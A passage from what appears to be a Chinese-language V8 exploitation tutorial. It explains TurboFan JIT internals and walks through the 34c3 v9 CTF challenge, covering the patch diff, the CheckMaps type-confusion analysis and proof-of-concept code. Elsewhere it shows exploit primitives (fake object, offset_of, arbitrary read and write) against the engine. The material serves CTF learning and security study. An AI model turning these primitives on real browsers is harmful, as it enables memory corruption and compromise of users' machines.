- spray_array_data_offset) / <span class="number">8n</span> + <span class="number">1n</span>] = <span class="title function_">u2d</span>(<span class="number">0xa0007ff1100083an</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// fake_double_array 的 map 指针指向伪造的 map</span></span><br><span class="line">spray_array[(fake_double_array_offset - spray_array_data_offset) / <span class="number">8n</span>] = <span class="title function_">u2d</span>(map_offset | <span class="number">1n</span> | (<span class="number">0x00002259n</span> &lt;&lt; <span class="number">32n</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 利用任意地址对象伪造漏洞（fake_object）泄露出 fake_double_array</span></span><br><span class="line"><span class="keyword">let</span> fake_double_array = <span class="title function_">trigger</span>(fake_double_array_offset | <span class="number">1n</span>);</span><br></pre></td></tr></table></figure></div>
<p><code>offset_of</code> 原语实现：我们只需要再申请一个大的
<code>ObjectArray</code>（我们称之为
<code>spray_object_array</code>）然后让伪造的 <code>DoubleArray</code>
的 <code>elements</code> 指针指向 <code>spray_object_array</code> 的
<code>elements</code>（<code>elements</code>
在沙箱内偏移固定）造成类型混淆。
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/2b4d01cdf3c289241c8526bdf9adbc50.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                ></p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> spray_object_array = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">0xf700</span>).<span class="title function_">fill</span>(&#123;&#125;);</span><br><span class="line"><span class="keyword">let</span> object_array_element_offset = <span class="number">0x00282141n</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">offset_of</span>(<span class="params">object</span>) &#123;</span><br><span class="line">    <span class="comment">// 将 object 添加到 spray_object_array 的 elements 中</span></span><br><span class="line">    spray_object_array[<span class="number">0</span>] = object;</span><br><span class="line">    <span class="comment">// fake_double_array 的 elements 指针指向 spray_object_array 的 elements</span></span><br><span class="line">    spray_array[(fake_double_array_offset - spray_array_data_offset) / <span class="number">8n</span> + <span class="number">1n</span>] = <span class="title function_">u2d</span>(object_array_element_offset | <span class="number">1n</span> | (<span class="number">0x00000002n</span> &lt;&lt; <span class="number">32n</span>));</span><br><span class="line">    <span class="comment">// 从 fake_double_array 读出 object 在沙箱中的偏移</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(fake_double_array[<span class="number">0</span>]) &amp; <span class="number">0xFFFFFFFFn</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><code>arbitrary_offset_read</code> 和
<code>arbitrary_offset_write</code> 原语实现：直接通过
<code>apray_array</code> 修改 <code>elements</code> 然后读写
<code>fake_double_array</code> 实现。
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/40d6aadbb91cf5e7bab20fb3feaa8493.png"
                      alt="在这里插入图片描述" style="zoom: 33%;" 
                ></p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">arbitrary_offset_read</span>(<span class="params">address</span>) &#123;</span><br><span class="line">    spray_array[(fake_double_array_offset - spray_array_data_offset) / <span class="number">8n</span> + <span class="number">1n</span>] = <span class="title function_">u2d</span>((address - <span class="number">8n</span>) | <span class="number">1n</span> | (<span class="number">0x00000002n</span> &lt;&lt; <span class="number">32n</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(fake_double_array[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbitrary_offset_write</span>(<span class="params">address, value</span>) &#123;</span><br><span class="line">    spray_array[(fake_double_array_offset - spray_array_data_offset) / <span class="number">8n</span> + <span class="number">1n</span>] = <span class="title function_">u2d</span>((address - <span class="number">8n</span>) | <span class="number">1n</span> | (<span class="number">0x00000002n</span> &lt;&lt; <span class="number">32n</span>));</span><br><span class="line">    fake_double_array[<span class="number">0</span>] = <span class="title function_">u2d</span>(value);</span><br></pre></td></tr></table></figure></div>
<h1 id="justintimecompiler">JustinTimeCompiler</h1>
<figure>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/4109726cb43700ba2053f1562ad5328f.png"
                     
alt="在这里插入图片描述" 
                >
<figcaption aria-hidden="true">在这里插入图片描述</figcaption>
</figure>
<h2 id="预测优化">预测优化</h2>
<p>Javascript是弱类型，函数参数的类型无法再翻译时确定，但是每一个函数调用，传进来的实参都有一个确定的类型，因此这个信息收集起来用来优化函数。</p>
<ul>
<li>Feedback Vector，收集参数类型 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/50fae3d29f2265768819de558d98ceff.png"
                     
alt="在这里插入图片描述" 
                ></li>
<li>Feedback 的变化遵循格的规律，不可逆。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/0415a8c76d1fc0c8b4211f2204eaa08f.png"
                     
alt="在这里插入图片描述" 
                ></li>
</ul>
<h2 id="工作原理">工作原理</h2>
<figure>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/e0a3f6080bea3dacd16e6600bcc983e6.png"
                     
alt="在这里插入图片描述" 
                >
<figcaption aria-hidden="true">在这里插入图片描述</figcaption>
</figure>
<figure>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/44b4d0ced5a0cb04a1d1e7fe92cf71e7.png"
                     
alt="在这里插入图片描述" 
                >
<figcaption aria-hidden="true">在这里插入图片描述</figcaption>
</figure>
<h2 id="sea-of-nodes">Sea of Nodes</h2>
<h3 id="基本概念">基本概念</h3>
<h4 id="ssastatic-single-assignment">SSA(static single assignment)</h4>
<p>这个是 IR 的一个属性。如果一套 IR
里面，规定了所有的变量一定被且只被赋值一次，且所有的变量在使用之前都保证被定义</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">0</span>;</span><br><span class="line">a = (a + <span class="number">2</span>) * <span class="number">3</span>;</span><br><span class="line">b = a + <span class="number">2</span>;</span><br></pre></td></tr></table></figure></div>
<p>普通的 IR</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">v_a = 0</span><br><span class="line">v_a = v_a + 2</span><br><span class="line">v_a = v_a * 3</span><br><span class="line">v_b = v_a + 2</span><br></pre></td></tr></table></figure></div>
<p>SSA 的 IR</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">v_a0 = 0</span><br><span class="line">v_a1 = v_a0 + 2</span><br><span class="line">v_a2 = v_a1 * 3</span><br><span class="line">v_b = v_a2 + 2</span><br></pre></td></tr></table></figure></div>
<h4 id="cfgcontrol-flow-graph">CFG(Control Flow Graph)</h4>
<p>控制流图是一个有向图，它的每一个结点由一个或多个指令转成。结点保证了只有在最后一条指令才能发生跳转，其他在结点里的所有指令都不会发生跳转。
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/876aa00ca9fbf797dad74af35ee24c47.png"
                     
alt="在这里插入图片描述" 
                ></p>
<h4 id="dfgdata-flow-graph">DFG(Data Flow Graph)</h4>
<p>数据流图则刻画了操作之前的数据依赖关系。图里的每一个结点都表示了一个操作，如果一个操作结点的结果被其他操作结点所使用，那么它们在数据流图里就会存在一条边。
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/a6c3f2f1bcd8d4741db4e01aaf336aa3.png"
                     
alt="在这里插入图片描述" 
                ></p>
<h3 id="依赖">依赖</h3>
<p>CFG 和 DFG
从不同的层面刻画了程序。它们有交集的地方。控制流中还有一定的数据流，数据流中含有一定的控制流。直接去操纵这两者进行优化，问题会变得复杂且容易出错。
在 JIT 中依赖有数据依赖、Effect依赖和控制依赖 3 种。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/6cd57cf7655930c41f71d454875b90e6.png"
                     
alt="在这里插入图片描述" 
                ></p>
<h4 id="数据依赖">数据依赖</h4>
<p>所有的计算操作都被刻画成图的结点 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/a7757ad400f4a4f570691d1c4507ee2d.png"
                     
alt="在这里插入图片描述" 
                >
没有控制流图那种严格的执行顺序，而是根据依赖关系，符合拓扑排序的所有顺序都是满足条件
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/63d6cecd17d990543b6e936e991dfa82.png"
                     
alt="在这里插入图片描述" 
                > <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/42918fead32d25fc816fe0a7dba91c41.png"
                     
alt="在这里插入图片描述" 
                ></p>
<h4 id="effect依赖">Effect依赖</h4>
<p>保证图中数据的读写顺序和源程序是一致的 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/fb87e78bdb0c9fe9693a237b34a8d109.png"
                     
alt="在这里插入图片描述" 
                ></p>
<h4 id="控制依赖">控制依赖</h4>
<p>规定了程序执行的顺序，但是比常规的 CFG 要宽松。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/264e73ea57d5d707a1013a5891774fbe.png"
                     
alt="在这里插入图片描述" 
                > <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/0c6724735e2c145b240a8da0aa242215.png"
                     
alt="在这里插入图片描述" 
                ></p>
<h3 id="操作符的特例化">操作符的特例化</h3>
<p>在 Sea of nodes 里面，操作符有三种级别，分别是
<code>Javascript</code> ，<code>Intermediate</code> ，以及
<code>mahine</code> 。从上往下分别是从抽象到具体，越往下就表示越优化。
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/139e319af448a78ffa14f66d3bf7c35c.png"
                     
alt="在这里插入图片描述" 
                ></p>
<h2 id="jit常见优化">JIT常见优化</h2>
<h3 id="type-and-range-analysis">Type and Range Analysis</h3>
<p>对数据的类型和范围进行分析能促进很多优化，比如bound
check的去除。当操作数为两个带有 type 和 range 的结点，输出结果也往往带着
type 和 range ，且 range 是根据两个操作数的 range 和操作符进行结合。
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/8cdcf2b6aa25a7360804883f46ff5a74.png"
                     
alt="在这里插入图片描述" 
                ></p>
<h3 id="规约reduction">规约(Reduction)</h3>
<h4 id="常量折叠constant-folding">常量折叠(constant folding)</h4>
<p>常量折叠就是当编译器判断出一个操作的结果恒为常量时，他就会把这个操作直接用其结果进行替代。
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/edbbe9d55493f65dce33639849194ccd.png"
                     
alt="在这里插入图片描述" 
                ></p>
<h4 id="强度折减strength-reduction">强度折减（strength reduction）</h4>
<p>强度折减将昂贵的运算以相同但是相对便宜的运算取代。比如用加法替代乘法，用左右移替代乘除法。
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/b1b65b804708e255d79d0fce82703146.png"
                     
alt="在这里插入图片描述" 
                ></p>
<h4 id="typed-lowering">Typed Lowering</h4>
<p>Typed Lowering利用运行信息如变量类型将操作具体化，减少抽象度。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/c4bc8455ef385bb57ce005db778d5460.png"
                     
alt="在这里插入图片描述" 
                ></p>
<h4 id="global-value-numbering">Global Value Numbering</h4>
<p>本质上就是尽可能多的进行等价替代，减少重复计算。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/d31d2de344434bb35e75c755d809fb90.png"
                     
alt="在这里插入图片描述" 
                ></p>
<h4 id="控制优化">控制优化</h4>
<figure>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/c0dc4e73512fc049511b2f31a3812b85.png"
                     
alt="在这里插入图片描述" 
                >
<figcaption aria-hidden="true">在这里插入图片描述</figcaption>
</figure>
<h3 id="inline">Inline</h3>
<p>inline 是把一些函数调用直接替换成函数执行体。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/0b2bc6bda174951f0a1a0a389cb41531.png"
                     
alt="在这里插入图片描述" 
                ></p>
<h3 id="escape-analysis">Escape Analysis</h3>
<p>决定一个对象的作用域是否被限制在当前的函数中。在 v8
中，它能减少在堆中分配对象的次数。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/be15d33251e5c3e49569356c634286a3.png"
                     
alt="在这里插入图片描述" 
                ></p>
<h2 id="v8流水线">V8流水线</h2>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/3a9c0cb83fc7cfe44978281c40fcacb0.png"
                     
alt="在这里插入图片描述" 
                > 具体看
<code>v8/src/compiler/pipeline.cc</code></p>
<ul>
<li>bytecode graph builder (GraphBuilderPhase)
<ul>
<li>建图，js 代码生成 sea of nodes</li>
</ul></li>
<li>inlining
<ul>
<li>删除不会执行的代码</li>
<li>函数内联，例如把 <code>JSCall</code>(<code>MathExpm1</code>) 替换为
<code>NumberExpm1</code></li>
<li>删除死节点到活节点的边</li>
</ul></li>
<li>Typer
<ul>
<li>将每个节点打上标签，例如数据范围和数据类型，并且计算的数据范围在接下来的所有阶段中都不会改变，也就是说接下里所有阶段的数据范围都继承自
typer 阶段</li>
</ul></li>
<li>typered lowering
<ul>
<li>删除不会执行的代码。</li>
<li>常量折叠，例如 <code>1 + 1</code> 替换为 <code>2</code>。</li>
<li>类型优化，例如根据传入的一个参数始终为 <code>-1</code> 将
<code>SameValue</code> 替换为 <code>ObjectIsMinusZero</code>。</li>
<li>根据 typer 阶段的预测值，预测 samevalue 的返回值，如果一定返回 true
或者 false ，就把 samevalue 替换成 true 或者 false 。</li>
</ul></li>
<li>loop peeling 貌似没啥用，所以导致 typered lowering 和 load
elimination 阶段效果相似。</li>
<li>load elimination 包含 RedundancyElimination ，根据 typer
阶段的预测值，预测 samevalue 的返回值，如果一定返回 true 或者
false，就把 samevalue 替换成 true 或者 false
。如果被优化的函数中，定义了全局的 array（前面不加 var 和
let），则根据定义的 array 中元素个数，把 checkbound 节点（checkbound
节点来源于对 array 的读写操作）的第二个输入从 loadfield 替换成“ array
中元素个数”这个常量。一般我们想要越界读写 array 都要去掉 checkbound
节点，触发“ simplified lowering 阶段去掉 checkbound
节点”优化前需要先触发“ load elimination
阶段”的这个优化。另外触发的函数的越界数组必须定义在函数内部，不能是全局的，否则
v8 无法确定数组中的元素个数。</li>
<li>escape analysis 把属性的值从对象中取出来。<code>LoadField</code> 从
<code>JSObject</code> 获取属性，如果获取的属性值确定，就把LoadField
替换成属性值。根据目前遇到的题目来看，escape analysis 对于不能 inline
的库函数的返回结果和另一个对象的属性进行比较之类的操作的时候会在这个阶段将属性的值从对象中取出来，否则如果有优化空间会在前一步的
load elimination
阶段将属性的值从对象中取出来同时根据预测的结果优化为常量。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/be15d33251e5c3e49569356c634286a3.png"
                     
alt="在这里插入图片描述" 
                ></li>
<li>simplified lowering 尝试对 samevalue 进行降级，因此会参考 samevalue
的两个输入预测 samevalue
的返回值，并影响后续节点的预测（但是range都没有改变）。并不会把
samevalue 替换成 true 或者 false 。根据访问范围是否始终在 Array
内决定是否去掉 CheckBounds 。 ## 例题：34c3 v9</li>
</ul>
<p><a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/v8_pwn/34c3_v9" >附件下载链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="环境搭建-1">环境搭建</h3>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir v8 &amp;&amp; cd v8</span><br><span class="line">fetch v8 &amp;&amp; cd v8</span><br><span class="line">git checkout 7.6.303.28</span><br><span class="line">gclient sync</span><br><span class="line">git clone https://github.com/saelo/v9.git</span><br><span class="line">patch -p1 &lt; v9/v9_7.2.patch</span><br><span class="line">./tools/dev/gm.py x64.release</span><br></pre></td></tr></table></figure></div>
<h3 id="漏洞分析-1">漏洞分析</h3>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">diff --git a/src/compiler/redundancy-elimination.cc b/src/compiler/redundancy-elimination.cc</span><br><span class="line">index b91b82e766..02c1e71203 100644</span><br><span class="line">--- a/src/compiler/redundancy-elimination.cc</span><br><span class="line">+++ b/src/compiler/redundancy-elimination.cc</span><br><span class="line">@@ -26,6 +26,7 @@ Reduction RedundancyElimination::Reduce(Node* node) &#123;</span><br><span class="line">     case IrOpcode::kCheckHeapObject:</span><br><span class="line">     case IrOpcode::kCheckIf:</span><br><span class="line">     case IrOpcode::kCheckInternalizedString:</span><br><span class="line">+    case IrOpcode::kCheckMaps:</span><br><span class="line">     case IrOpcode::kCheckNotTaggedHole:</span><br><span class="line">     case IrOpcode::kCheckNumber:</span><br><span class="line">     case IrOpcode::kCheckReceiver:</span><br><span class="line">@@ -158,8 +159,8 @@ bool CheckSubsumes(Node const* a, Node const* b) &#123;</span><br><span class="line">         case IrOpcode::kCheckedUint32ToInt32:</span><br><span class="line">         case IrOpcode::kCheckedUint32ToTaggedSigned:</span><br><span class="line">         case IrOpcode::kCheckedUint64Bounds:</span><br><span class="line">-        case IrOpcode::kCheckedUint64ToInt32:</span><br><span class="line">         case IrOpcode::kCheckedUint64ToTaggedSigned:</span><br><span class="line">+        case IrOpcode::kCheckedUint64ToInt32:</span><br><span class="line">           break;</span><br><span class="line">         case IrOpcode::kCheckedFloat64ToInt32:</span><br><span class="line">         case IrOpcode::kCheckedFloat64ToInt64:</span><br><span class="line">@@ -188,6 +189,15 @@ bool CheckSubsumes(Node const* a, Node const* b) &#123;</span><br><span class="line">           &#125;</span><br><span class="line">           break;</span><br><span class="line">         &#125;</span><br><span class="line">+        case IrOpcode::kCheckMaps: &#123;</span><br><span class="line">+            // CheckMaps are compatible if the first checks a subset of the second.</span><br><span class="line">+            ZoneHandleSet&lt;Map&gt; const&amp; a_maps = CheckMapsParametersOf(a-&gt;op()).maps();</span><br><span class="line">+            ZoneHandleSet&lt;Map&gt; const&amp; b_maps = CheckMapsParametersOf(b-&gt;op()).maps();</span><br><span class="line">+            if (!b_maps.contains(a_maps)) &#123;</span><br><span class="line">+                return false;</span><br><span class="line">+            &#125;</span><br><span class="line">+            break;</span><br><span class="line">+        &#125;</span><br><span class="line">         default:</span><br><span class="line">           DCHECK(!IsCheckedWithFeedback(a-&gt;op()));</span><br><span class="line">           return false;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>分析 diff 文件，发现增加了 <code>kCheckMaps</code> 的 reduce
优化，这个优化的作用是合并两个 <code>kCheckMaps</code>
操作，而合并的条件是前一个 <code>kCheckMaps</code>
的判断条件包含了后一个 <code>kCheckMaps</code> 的全部判断条件。
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">CheckSubsumes</span><span class="params">(Node <span class="type">const</span>* a, Node <span class="type">const</span>* b)</span> </span>&#123;</span><br><span class="line">      ...</span><br><span class="line">      <span class="keyword">switch</span> (a-&gt;<span class="built_in">opcode</span>()) &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">case</span> IrOpcode::kCheckMaps: &#123;</span><br><span class="line">            <span class="comment">// CheckMaps are compatible if the first checks a subset of the second.</span></span><br><span class="line">            ZoneHandleSet&lt;Map&gt; <span class="type">const</span>&amp; a_maps = <span class="built_in">CheckMapsParametersOf</span>(a-&gt;<span class="built_in">op</span>()).<span class="built_in">maps</span>();</span><br><span class="line">            ZoneHandleSet&lt;Map&gt; <span class="type">const</span>&amp; b_maps = <span class="built_in">CheckMapsParametersOf</span>(b-&gt;<span class="built_in">op</span>()).<span class="built_in">maps</span>();</span><br><span class="line">            <span class="keyword">if</span> (!b_maps.<span class="built_in">contains</span>(a_maps)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Node* RedundancyElimination::EffectPathChecks::<span class="built_in">LookupCheck</span>(Node* node) <span class="type">const</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (Check <span class="type">const</span>* check = head_; check != <span class="literal">nullptr</span>; check = check-&gt;next) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">CheckSubsumes</span>(check-&gt;node, node) &amp;&amp; <span class="built_in">TypeSubsumes</span>(node, check-&gt;node)) &#123;</span><br><span class="line">      <span class="built_in">DCHECK</span>(!check-&gt;node-&gt;<span class="built_in">IsDead</span>());</span><br><span class="line">      <span class="keyword">return</span> check-&gt;node;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Reduction <span class="title">RedundancyElimination::ReduceCheckNode</span><span class="params">(Node* node)</span> </span>&#123;</span><br><span class="line">  Node* <span class="type">const</span> effect = NodeProperties::<span class="built_in">GetEffectInput</span>(node);</span><br><span class="line">  EffectPathChecks <span class="type">const</span>* checks = node_checks_.<span class="built_in">Get</span>(effect);</span><br><span class="line">  <span class="comment">// If we do not know anything about the predecessor, do not propagate just yet</span></span><br><span class="line">  <span class="comment">// because we will have to recompute anyway once we compute the predecessor.</span></span><br><span class="line">  <span class="keyword">if</span> (checks == <span class="literal">nullptr</span>) <span class="keyword">return</span> <span class="built_in">NoChange</span>();</span><br><span class="line">  <span class="comment">// See if we have another check that dominates us.</span></span><br><span class="line">  <span class="keyword">if</span> (Node* check = checks-&gt;<span class="built_in">LookupCheck</span>(node)) &#123;</span><br><span class="line">    <span class="built_in">ReplaceWithValue</span>(node, check);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Replace</span>(check);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Learn from this check.</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">UpdateChecks</span>(node, checks-&gt;<span class="built_in">AddCheck</span>(<span class="built_in">zone</span>(), node));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Reduction <span class="title">RedundancyElimination::Reduce</span><span class="params">(Node* node)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (node_checks_.<span class="built_in">Get</span>(node)) <span class="keyword">return</span> <span class="built_in">NoChange</span>();</span><br><span class="line">  <span class="keyword">switch</span> (node-&gt;<span class="built_in">opcode</span>()) &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">case</span> IrOpcode::kCheckMaps:</span><br><span class="line">    ...</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">ReduceCheckNode</span>(node);</span><br></pre></td></tr></table></figure></div> 因此如果两次 <code>kCheckMaps</code> 之间如果一直没有修改
<code>map</code> 那么经过 JIT 优化后后一个 <code>kCheckMaps</code>
会被去除，而此时如果修改了 <code>map</code> 则由于缺少对
<code>map</code> 的检查导致类型混淆。 poc 如下：</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> array_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getBigUint64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getFloat64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">address_of</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> a = [<span class="number">.1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">trigger</span>(<span class="params">callback</span>) &#123;</span><br><span class="line">        <span class="comment">// Generate first MapCheck</span></span><br><span class="line">        a[<span class="number">0</span>];</span><br><span class="line">        <span class="comment">// This callback could change the Map ...</span></span><br><span class="line">        <span class="title function_">callback</span>();</span><br><span class="line">        <span class="comment">// ... but this MapCheck will still be removed ¯\_(ツ)_/¯</span></span><br><span class="line">        <span class="keyword">return</span> a[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">evil_callback</span>(<span class="params"></span>) &#123;</span><br><span class="line">        a[<span class="number">0</span>] = obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        <span class="title function_">trigger</span>(<span class="function">() =&gt;</span> &#123; &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(<span class="title function_">trigger</span>(evil_callback));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(<span class="title function_">hex</span>(<span class="title function_">address_of</span>(array_buffer)));</span><br><span class="line"></span><br><span class="line">% <span class="title class_">DebugPrint</span>(array_buffer);</span><br></pre></td></tr></table></figure></div>
<p>首先定位 <code>kCheckMaps</code> 所在的优化的阶段。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/94f0d91ba598e5835839fc547519d972.png"
                     
alt="在这里插入图片描述" 
                > 选择最早的优化阶段，最终确定是在
<code>V8.TFLoadElimination</code> 阶段调用的此优化。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">LoadEliminationPhase</span> &#123;</span><br><span class="line">  <span class="function"><span class="type">static</span> <span class="type">const</span> <span class="type">char</span>* <span class="title">phase_name</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="string">&quot;V8.TFLoadElimination&quot;</span>; &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">    <span class="function">RedundancyElimination <span class="title">redundancy_elimination</span><span class="params">(&amp;graph_reducer, temp_zone)</span></span>;</span><br><span class="line">    ...</span><br><span class="line">    <span class="built_in">AddReducer</span>(data, &amp;graph_reducer, &amp;redundancy_elimination);</span><br><span class="line">    ...</span><br><span class="line">    graph_reducer.<span class="built_in">ReduceGraph</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<p>观察 <code>kCheckMaps</code> 优化前后 <code>trigger</code>
函数的变化。 在 <code>kCheckMaps</code> 优化前，有两处
<code>CheckMaps</code> 操作，一个在 <code>a[0];</code> 前，另一个在
<code>return a[0];</code> 前。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/d95d1bd2b7158e24a294f4a4d5138ebb.png"
                     
alt="在这里插入图片描述" 
                > <code>kCheckMaps</code> 优化后，第二处
<code>CheckMaps</code> 操作被优化掉，这是因为 <code>kCheckMaps</code>
优化认为第一次 <code>CheckMaps</code> 检查的条件包含了第二次
<code>CheckMaps</code> 检查的条件，所以可以去掉。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/6acf64ba4f00381a5b252aac0335a128.png"
                     
alt="在这里插入图片描述" 
                > 然而两次 <code>kCheckMaps</code> 之间调用
<code>callback</code> 函数会修改 <code>map</code> 属性，浮点数数组变为
object 数组，然而在 <code>trigger</code>
函数中依然认为这个数组是浮点数数组，因此可以造成类型混淆，从而实现
address of 利用原语。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/35b7a940cdd238331c8b0b0141a1c066.png"
                     
alt="在这里插入图片描述" 
                > 同理，fake object 原语也可以实现。</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> array_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getBigUint64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title 